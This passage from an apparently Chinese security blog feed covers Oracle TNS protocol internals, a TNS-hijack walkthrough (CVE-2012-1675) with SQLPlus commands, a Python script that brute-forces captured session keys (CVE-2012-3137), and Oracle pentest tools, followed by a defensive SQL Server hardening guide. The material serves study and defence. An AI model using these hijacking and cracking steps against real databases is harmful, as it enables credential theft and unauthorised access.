52 4f 52 3d 28 43 4f 44 45 3d 31 32 35 31  ERROR=(CODE=1251</span><br><span class="line">  34 29 28 45 4d 46 49 3d 34 29 29 29 29           4)(EMFI=4))))</span><br></pre></td></tr></table></figure><p>​         DATA 包是类型6，包括2个字节的 flag 标志位，1字节的 packet id，可选的 TTI id，还有数据本身。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0           16   24    31</span><br><span class="line">+-----------+----+-----+</span><br><span class="line">| Data Flag | ID |&lt;TTI&gt;|</span><br><span class="line">+----------------------+</span><br><span class="line">|        D A T A       |</span><br><span class="line">+----------------------+</span><br></pre></td></tr></table></figure><p>字段说明：</p><p>Data Flag: 数据标识</p><p>ID：   包ID</p><p>TTI:    TTI(Two-Task Interface) ID</p><p>DATA:   有效数据</p><p>Data Flag 通常是 0x0000， 当所有数据发送完毕指示文件结尾，值为 0x0040</p><p>下面是列出了有效的数据包ID:</p><table><thead><tr><th>ID</th><th>描述</th></tr></thead><tbody><tr><td>0x01</td><td>协议协商。下面这些标识是可以接受的协议版本：0x06 0x05 0x04 0x03 0x02 0x01 0x00</td></tr><tr><td>0x02</td><td>交换数据类型</td></tr><tr><td>0x08</td><td>“OK”服务器给客户端的响应</td></tr><tr><td>0x11</td><td>TTI (Two-Task Interface)功能扩展</td></tr><tr><td>0x20</td><td>使用外部的程序和服务注册</td></tr><tr><td>0xdeadbeef</td><td>附加网络选项，客户端可协商附加连接熟悉，例如：认证，加密，数据完整性，监控。注意：wireshark 中叫这个包为 Secure Network Services</td></tr></tbody></table><h2 id="Oracle-Database-TNS-漏洞"><a href="#Oracle-Database-TNS-漏洞" class="headerlink" title="Oracle Database  TNS 漏洞"></a>Oracle Database  TNS 漏洞</h2><h3 id="TNS劫持"><a href="#TNS劫持" class="headerlink" title="TNS劫持"></a>TNS劫持</h3><p>​        知道目标物理地址和端口，本地搭建同名数据库，通过远程注册目标机器的TNS下同名实例</p><p>​        CVE-2012-1675漏洞是Oracle允许攻击者在不提供用户名/密码的情况下，向远程“TNS Listener”组件处理的数据投毒的漏洞。攻击者可利用此漏洞将数据库服务器的合法“TNS Listener”组件中的数据转向到攻击者控制的系统，导致控制远程组件的数据库实例，造成组件和合法数据库之间的中间人攻击、会话劫持或拒绝服务攻击。</p><p>​        CVE-2012-3137漏洞是Oracle Database 10g/11g身份验证协议实现中存在一个设计缺陷，攻击者无需认证即可远程获取数据库用户密码哈希相关数据，从而可以离线暴力破解用户密码，进一步控制数据库系统。</p><p>我们通过如下的步骤和过程可以实现对Oracle的入侵：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">（<span class="number">1</span>）利用CVE-<span class="number">2012</span>-<span class="number">1675</span>进行TNS劫持，在监听下利用远程注册，注册同名数据库实例；</span><br><span class="line">（<span class="number">2</span>）新登陆的用户，在TNS的负载均衡策略下，有可能流量登录到伪造的监听服务上；</span><br><span class="line">（<span class="number">3</span>）该监听服务对用户的登陆过程进行监控，并将相关数据流量转发到真实的数据库上；</span><br><span class="line">（<span class="number">4</span>）利用CVE-<span class="number">2012</span>-<span class="number">3137</span>获得通讯过程中的认证相关信息；</span><br><span class="line">（<span class="number">5</span>）对认证相关信息进行离线的暴力破解，获得登陆的密码；</span><br><span class="line">（<span class="number">6</span>）试用破解的用户名/密码登陆Oracle，完成对Oracle中数据的访问；</span><br></pre></td></tr></table></figure><p><strong>下面是一段可用的TNS劫持的过程：</strong></p><p>1.在劫持机上创建一个和目标数据库实例同名的数据库实例。</p><p>2.在劫持机上修改 tnsnames.ora 文件</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">添加</span><br><span class="line">listener_name=</span><br><span class="line">    (DESCRIPTION=</span><br><span class="line">    (ADDRESS=(PROTOCOL=tcp)(HOST=目标机器IP)(PORT=目标机器端口)))</span><br></pre></td></tr></table></figure><p>3.在劫持机上用SQLPlus 顺序执行下面步骤。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">客户端向TNS </span><br><span class="line">侦听器发送一个“数据包”（TNS_TYPE_DATA = 6），其中包含以下数据：</span><br><span class="line"></span><br><span class="line">  1.要注册的服务名称。</span><br><span class="line">  2.以指定的服务名称注册的实例。</span><br><span class="line">  3.允许的最大客户端连接数。</span><br><span class="line">  4.当前建立的客户端连接数。</span><br><span class="line">  5.处理程序的名称。</span><br><span class="line">  6.连接数据库的IP地址和端口。</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>$ sqlplus / <span class="keyword">as</span> sysdba</span><br><span class="line"><span class="number">2.</span> SQL&gt; ALTER SYSTEM SETREMOTE_LISTENER=<span class="string">&#x27;LISTENER_NAME&#x27;</span>;</span><br><span class="line"><span class="number">3.</span> SQL&gt; ALTER SYSTEM REGISTER;</span><br></pre></td></tr></table></figure><p>4.多个客户端，向数据库发起登录。会劫持到一部分客户端的登录信息。</p><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/Oracle%20Database/Oracle-Database%E7%AE%80%E5%8D%95%E6%A6%82%E8%BF%B0/7.png"></p><p>​        按照猜想同一个监听下有2个同名实例。客户端访问监听，监听按照客户端中的数据库名信息分配数据库，由于监听下有2个同名数据库，客户端链接很可能会被分配到劫持者的数据库实例下，再通过配置劫持者的本地监听把客户端请求指回原数据库。</p><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/Oracle%20Database/Oracle-Database%E7%AE%80%E5%8D%95%E6%A6%82%E8%BF%B0/9.png"></p><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/Oracle%20Database/Oracle-Database%E7%AE%80%E5%8D%95%E6%A6%82%E8%BF%B0/8.png"></p><p>​        通过以上方式我们可以截获约一半左右客户端发送到服务器的合法链接。其中获得了服务器IP、端口号、数据库位置、实例名、登录用户名等一系列明文信息和4组密文信息（AUTH_SESSKEY，AUTH_SESSKEY_CLIENT，AUTH_PASSWORD，AUTH_VFR_DATA）。</p><p>​        通过CVE-2012-3137进行密码破解</p><p>CVE-2012-3137受影响的数据库版本有11.2.0.3，11.2.0.2，11.1.0.7,有使用了SHA-1加密算法的10.2.0.5和10.2.0.4，还有使用了SHA-1的10.2.0.3（运行在z/OS下）版本。</p><p>​        确认加密方式之后，数据库用户被O3logon（oracle验证方式） 进行验证，这个协议执行一个序列来向数据库证明客户端拥有密码。为了避免网络第三方截获到密码。首先客户端发送用户名到数据库来表明用户身份。数据库端根据加密协议，其中96位的作为数据库端密钥，20位的作为偏移量，它对每个连接都是不同的。一个典型的数据库端发给客户端的密钥如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AUTH_SESSKEY.....COCDD89FIGODKWASDF……………………</span><br></pre></td></tr></table></figure><p>​        客户端根据加密算法向服务器端发送96位的客户端密钥和64位的密码密钥。服务器端计算客户端传入的密码密钥。如果计算后密码密文和数据库中存储的16位密码密文一致则验证通过。</p><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/Oracle%20Database/Oracle-Database%E7%AE%80%E5%8D%95%E6%A6%82%E8%BF%B0/6.jpg"></p><p>​        这个过程可知上面TNS劫持包中取得的加密信息：AUTH_SESSKEY，AUTH_SESSKEY_CLIENT，AUTH_PASSWORD，AUTH_VFR_DATA这四个值是解密的关键。我们把他们按照SHA1,MD5，AES192进行一系列处理。最终通过数据字典碰撞得到密码明文。</p><pre><code>import hashlib    from Crypto.Cipher import AESdef decrypt(session,salt,password):    pass_hash= hashlib.sha1(password+salt)    key =pass_hash.digest() + &#39;\x00\x00\x00\x00&#39;    decryptor= AES.new(key,AES.MODE_CBC)    plain =decryptor.decrypt(session)    return plainsession_hex =&#39;EA2043CB8B46E3864311C68BDC161F8CA170363C1E6F57F3EBC6435F541A8239B6DBA16EAAB5422553A7598143E78767&#39;  salt_hex = &#39;A7193E546377EC56639E&#39;  passwords = [&#39;test&#39;,&#39;password&#39;,&#39;oracle&#39;,&#39;demo&#39;]  for password in passwords:    session_id= decrypt(session_hex.decode(&#39;hex&#39;),salt_hex.decode(&#39;hex&#39;),password)    print&#39;Decrypted session_id for password &quot;%s&quot; is %s&#39; %(password,session_id.encode(&#39;hex&#39;))    if session_id[40:] == &#39;\x08\x08\x08\x08\x08\x08\x08\x08&#39;:           print&#39;PASSWORD IS &quot;%s&quot;&#39; % password           break</code></pre><h3 id="TNS缓冲区溢出"><a href="#TNS缓冲区溢出" class="headerlink" title="TNS缓冲区溢出"></a>TNS缓冲区溢出</h3><p>ORACLE调用系统用户做认证</p><p>CVE-2002-0965</p><p>SERVICE_NAME值超过20字节，导致溢出。</p><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/Oracle%20Database/Oracle-Database%E7%AE%80%E5%8D%95%E6%A6%82%E8%BF%B0/11.png"></p><h2 id="Oracle-Database-SQL注入漏洞"><a href="#Oracle-Database-SQL注入漏洞" class="headerlink" title="Oracle Database SQL注入漏洞"></a>Oracle Database SQL注入漏洞</h2><p><strong>一、直接sql语句</strong></p><p>​    第二个请求有用户名和密文口令，下面有名称值对列表，描述客户端的属性，这部分可替换成任何sql语句，在sys环境执行。登录数据库时就可以创建用户。</p><p><img src="/10.PNG"></p><p><strong>二、PL/SQL语言</strong></p><p>匿名块：单次调用</p><p>命名块：有名称，存储在服务器，可多次调用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">DECLARE</span><br><span class="line">BEGIN</span><br><span class="line">EXCEPTION</span><br><span class="line">END</span><br></pre></td></tr></table></figure><p>变量的作用</p><p>在DECLARE阶段声明</p><p>每一行只能声明一个变量</p><p>声明标识符不能超过30字符，第一个字符为字母，不分大小写，不能用 -，不能用保留字，不能和引用的列同名，列名的优先级别高于变量。</p><p>PL/SQL变量：</p><p>复合变量：数组、记录、PL/SQL表</p><p>非PL/SQL变量</p><h2 id="Oracle-数据库评估工具"><a href="#Oracle-数据库评估工具" class="headerlink" title="Oracle 数据库评估工具"></a>Oracle 数据库评估工具</h2><h3 id="sidguesser"><a href="#sidguesser" class="headerlink" title="sidguesser"></a><strong>sidguesser</strong></h3><p>​        基于字典的SID爆破工具</p><ul><li>Oracle 数据库实例名称SID</li><li>一个数据库服务器可以创建多个数据库实例</li><li>SID是数据访问的入口</li></ul><p>​        Oracle是一个大型的数据库管理系统，在一台Oracle服务器上，我们可以为不同的应用创建各自独立的数据库实例。为了方便管理和访问不同的数据库实例，操作系统通过SID来识别不同的数据库。作为渗透测试者，发现库实例的SID是实现数据访问的第一步。sidguesser是一个基于字典的SID枚举工具，帮助渗透测试者发现数据访问的入口。</p><p>​        使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sidguess -i IP -d dict.txt</span><br></pre></td></tr></table></figure><h3 id="oscanner"><a href="#oscanner" class="headerlink" title="oscanner"></a><strong>oscanner</strong></h3><p>​        oscanner是一款针对oracle数据库服务器进行安全评估的框架软件，功能包括SID、身份信息、密码策略、用户角色权限等的爆破和枚举检查。由于此工具内建字典过于简陋，因此要想发挥应有的作用，我们必须手动完善字典内容。</p><ul><li><p>Java开发的Oracle安全评估框架</p></li><li><p>基于插件、字典的架构</p></li><li><p>SID枚举</p></li><li><p>密码爆破</p></li><li><p>Oracle版本枚举</p></li><li><p>账号角色枚举</p></li><li><p>账号权限枚举</p></li><li><p>审计信息枚举</p></li><li><p>密码策略枚举（自己配置密码字典，默认密码字典太简单）</p></li><li><p>数据库链接枚举</p><p>​    配置文件</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/oscanner/default.conf</span><br><span class="line">/usr/share/oscanner/diftionary.txt</span><br><span class="line">/usr/share/oscanner/users.txt</span><br><span class="line">/usr/share/oscanner/service.txt</span><br><span class="line">/usr/share/oscanner/oracleplugins.default</span><br><span class="line">/usr/share/oscanner/accounts.default</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">oscanner -s server -f serverlist -P 1521</span><br></pre></td></tr></table></figure><h3 id="tnscmd10g"><a href="#tnscmd10g" class="headerlink" title="tnscmd10g"></a><strong>tnscmd10g</strong></h3><p>​        Oracle数据库管理系统默认的服务端口是TCP  1521。在早期版本的Oracle系统中，通过对此端口的探测，可以获得大量系统信息，这给渗透测提供了有利的前提。tnscmd10g  主要针对7-9版本的Oracle数据库服务器，进行应用和操作系统层面的信息收集。同时也可以利用漏洞，直接输入并执行系统指令，上传和启动后门程序。10g以后版本的Oracle数据库大大提升了系统的安全性，使得本工具效果受限。</p><ul><li>针对Oracle 7-9i的信息收集工具</li><li>向TNS监听程序发送指令（TCP 1521）</li><li>爆破SID</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tnscmd10g verssion -h 192.168.1.1</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h2 id=&quot;Oracle-数据库体系结构&quot;&gt;&lt;a href=&quot;#Oracle-数据库体系结构&quot; class=&quot;headerlink&quot; title=&quot;Oracle 数据库体系结构&quot;&gt;&lt;/a&gt;Oracle 数据库体系结构&lt;/h2&gt;&lt;img src=&quot;/w</summary>
      
    
    
    
    <category term="数据库攻防" scheme="http://example.com/categories/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/"/>
    
    <category term="Oracle Database" scheme="http://example.com/categories/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/Oracle-Database/"/>
    
    
    <category term="Oracle Database" scheme="http://example.com/tags/Oracle-Database/"/>
    
  </entry>
  
  <entry>
    <title>SQL Server数据库安全加固</title>
    <link href="http://example.com/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA/"/>
    <id>http://example.com/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA/</id>
    <published>2021-07-03T02:34:50.000Z</published>
    <updated>2021-07-03T02:53:30.379Z</updated>
    
    <content type="html"><![CDATA[<h2 id="SQL-Server加固"><a href="#SQL-Server加固" class="headerlink" title="SQL Server加固"></a>SQL Server加固</h2><h3 id="账号管理"><a href="#账号管理" class="headerlink" title="账号管理"></a>账号管理</h3><p><strong>查询目前所有用户列表</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select name,password from syslogins order by name</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA/%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA-0.png"></p><p><strong>为不同的管理员分配不同的账号</strong></p><p>按照使用目的进行分配账号，避免不同用户间共享账号，提高安全性。或在企业管理器中直接添加远程登陆用户建立角色，并给角色授权，把角色赋给不同的用户或修改用户属性中的角色和权限。</p><p>添加不同用户，参考配置操作：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sp_addlogin &#x27;user1&#x27;,&#x27;password1&#x27;</span><br><span class="line">sp_addlogin &#x27;user2&#x27;,&#x27;password2&#x27;</span><br></pre></td></tr></table></figure><p><strong>删除或锁定无效账号</strong></p><p>删除冗余的系统默认账号，减少系统安全隐患，参考配置操作。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Microsoft SQL Server Management Studio -&gt; SQL Server -&gt; 安全性 -&gt; 登录名 -&gt; 选择要删除的用户名（右键）</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA/%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA-1.png"></p><p><strong>限制启动账号权限</strong></p><p>启动mssql的用户权限过高，会导致其子进程具有相同权限，参考配置操作：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Microsoft SQL Server Management Studio -&gt; SQL Server -&gt;属性(右键) -&gt; 安全性</span><br></pre></td></tr></table></figure><p>新建SQL server服务账号后，建议将其从User组中删除，且不要把该账号提升为Administrators组的成员，授予以账户最少启动权限。</p><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA/%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA-3.png"></p><h3 id="认证授权"><a href="#认证授权" class="headerlink" title="认证授权"></a>认证授权</h3><p> <strong>权限最小化</strong></p><p>在数据库权限配置能力内，根据用户的业务需要，配置其所需的最小权限，参考配置操作：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Microsoft SQL Server Management Studio -&gt; SQL Server -&gt; 属性(右键) -&gt; 安全性</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA/%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA-2.png"></p><p><strong>数据库角色</strong></p><p>使用数据库角色（ROLE）来管理对象的权限，参考配置操作：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Microsoft SQL Server Management Studio -&gt; SQL Server -&gt; 安全性 -&gt; 服务器角色（右键）-&gt; 新服务器角色</span><br></pre></td></tr></table></figure><p>调整角色属性中的权限，赋予角色中拥有对象对应的SELECT、INSERT、UPDATE、DELETE、EXEC、DRI权限 </p><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA/%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA-4.png"></p><p><strong>是否存在空密码用户</strong></p><p>对所有账户的属性进行审计，包括空密码、密码更新时间等。修改目前所有账号的口令，确认为强口令。特别是sa 账号。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from sysusers </span><br><span class="line">select name,Password from syslogins where password is null order by name  # 查看口令为空的用户 </span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA/%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA-5.png"></p><p>使用sp_password更新用户密码，特别是sa 账号，需要设置至少10位的强口令。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec sp_password &#x27;old_passwd&#x27;, &#x27;new_passwd&#x27;, sa</span><br></pre></td></tr></table></figure><p><strong>锁定特权</strong></p><p>默认情况下，SQL Server安装会在模型数据库之外的所有数据库中授予guest帐户公共角色成员身份。 建议在Windows中禁用guest帐户，并撤消其对除master和tempdb之外的所有数据库的访问权限。参考配置操作，使用以下命令删除数据库访问权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use msdb;</span><br><span class="line">exec sp_revokedbaccess guest;</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA/%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA-15.png"></p><p>Public不应访问Web任务表，因为它们可以使表数据可供Web客户端使用。 特权应被撤销：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">revoke update on mswebtasks to public</span><br><span class="line">revoke insert on mswebtasks to public</span><br></pre></td></tr></table></figure><p>Microsoft数据转换服务（DTS）程序包是一组COM接口，可用于在SQL Server上使用以下命令执行许多管理任务：T-SQL，Windows脚本和可执行工具。 默认情况下，企业管理器用户可以访问可用DTS软件包列表。 过程sp_enum_ dtspackages将显示可以输入到sp_get_dtspackage中的软件包名称和ID号，这将返回软件包数据。 然后，攻击者可能会将程序包放入他的SQL Server本地安装中，并查看程序包详细信息，其中通常包含其他服务器的凭据。 这些程序的特权应被删除：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">revoke execute on sp_enum_dtspackages to public</span><br><span class="line">revoke execute on sp_get_dtspackage to public</span><br></pre></td></tr></table></figure><p>sp_get_SQLAgent_properties存储过程，用于显示SQL Server代理服务连接到数据库服务器的混淆密码。 使用此工具（<a href="http://jimmers.narod.ru/agent_pwd.c%EF%BC%89%E5%8F%AF%E4%BB%A5%E8%A7%A3%E6%B7%B7%E6%B7%86%E3%80%82">http://jimmers.narod.ru/agent_pwd.c）可以解混淆。</a> 应删除此程序的权限：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">revoke execute on sp_get_SQLAgent_properties to public</span><br></pre></td></tr></table></figure><p>Microsoft数据转换服务（DTS）用于处理来自多个源（例如OLE DB，ODBC或文本文件）的数据。 连接密码以明文形式保存在Col11120列的表RTblDBMProps中，因此任何具有选择特权的人都可以检索到。 使用以下命令锁定此表的权限：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">revoke select on RTblDBMProps to public</span><br><span class="line">revoke update on RTblDBMProps to public</span><br><span class="line">revoke insert on RTblDBMProps to public</span><br><span class="line">revoke delete on RTblDBMProps to public</span><br></pre></td></tr></table></figure><h3 id="配置日志审计"><a href="#配置日志审计" class="headerlink" title="配置日志审计"></a>配置日志审计</h3><p><strong>开启日志审计功能</strong></p><p>数据库应配置日志功能，对用户登录进行审计，日志内容包括用户登录使用的账号、登录是否成功、登录时间等。</p><p>打开数据库属性，查看安全性，将服务器身份验证调整为“SQL Server 和Windows身份验证模式” ，安全性中的登录审核调整为“失败和成功的登录”。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Microsoft SQL Server Management Studio -&gt; SQL Server（右键） -&gt; 属性 -&gt; 安全性</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA/%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA-6.png"></p><p>或者通过将以下注册表值设置为2（将其设置为3还将记录成功的登录）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\MSSQLServer\MSSQLServer\AuditLevel</span><br></pre></td></tr></table></figure><h3 id="配置网络通信协议"><a href="#配置网络通信协议" class="headerlink" title="配置网络通信协议"></a>配置网络通信协议</h3><p><strong>禁用不必要的网络服务</strong></p><p>SQL Server使用的网络通信协议应限制为最小基础架构所需。 禁用SQL Server运行冗余服务。 启用陌生的网络通信协议，可能增加数据库网络风险。TCP/IP是最常用的用于SQL Server的网络协议栈，它与SSL一起为访问SQL Server提供安全的基础。</p><p>Microsoft SQL Server程序组, 运行服务网络实用工具。建议只使用TCP/IP协议，禁用其他协议。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SQL Server Configuration Manager -&gt; SQL Server网络配置 -&gt; MSSQLSERVER的协议</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA/%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA-7.png"></p><p><strong>加固TCP/IP协议栈</strong></p><p>查看注册表键值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HKLM\System\CurrentControlSet\Services\Tcpip\Parameters\DisableIPSourceRouting</span><br><span class="line">HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\EnableICMPRedirect</span><br><span class="line">HKLM\System\CurrentControlSet\Services\Tcpip\Parameters\SynAttackProtect</span><br></pre></td></tr></table></figure><p>参考配置操作</p><p>对于TCP/IP协议栈的加固主要是某些注册表键值的修改。主要是以下几个：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKLM\System\CurrentControlSet\Services\Tcpip\Parameters\DisableIPSourceRouting #说明：该键值应设为2，以防御源路由欺骗攻击。HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\EnableICMPRedirect #说明：该键值应设为0，以ICMP重定向。HKLM\System\CurrentControlSet\Services\Tcpip\Parameters\SynAttackProtect #说明：该键值应设为2，防御SYN FLOOD攻击。</span><br></pre></td></tr></table></figure><p><strong>使用加密通讯协议</strong></p><p>启动SQL Server配置工具，启用“强制协议加密”。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SQL Server Configuration Manager -&gt; SQL Server网络配置 -&gt; MSSQLSERVER的协议（右键） -&gt; 属性</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA/%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA-8.png"></p><h3 id="删除不必要的存储过程"><a href="#删除不必要的存储过程" class="headerlink" title="删除不必要的存储过程"></a>删除不必要的存储过程</h3><p>查询已有的所有的存储过程</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from sysobjects where xtype=&#x27;P&#x27;</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA/%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA-9.png"></p><p>或者</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Microsoft SQL Server Management Studio -&gt; SQL Server -&gt; 数据库 -&gt; 系统数据库 -&gt; master（举例）-&gt; 可编程性 -&gt; 存储过程/扩展存储过程 -&gt; 